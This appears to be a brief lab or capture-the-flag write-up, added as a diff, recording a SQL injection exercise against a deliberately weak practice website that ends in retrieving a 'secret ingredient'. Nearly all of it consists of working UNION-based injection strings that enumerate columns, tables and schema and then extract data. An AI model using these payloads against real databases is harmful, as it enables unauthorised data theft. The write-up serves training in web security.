@@ -1,0 +1,15 @@
+https://weaksauce.azurewebsites.net/
+
+I was able to determine the number of columns with:
+' UNION SELECT '1','2','3','4','5';--
+
+I was able to get table names with:
+' UNION SELECT '1',sobjects.name,'3','4','5' FROM sys.objects sobjects WHERE sobjects.type ='U';--
+
+I got the column names for the recipe table with:
+' UNION SELECT '1',COLUMN_NAME,'3','4','5' FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Recipe' AND TABLE_SCHEMA='dbo';--
+
+I, finally, got the secret ingredient with:
+' UNION SELECT '0',SecretIngredient, '2', '3', '4' FROM Recipe;--
+
+The SecretIngredient: Thousand Island Dressing
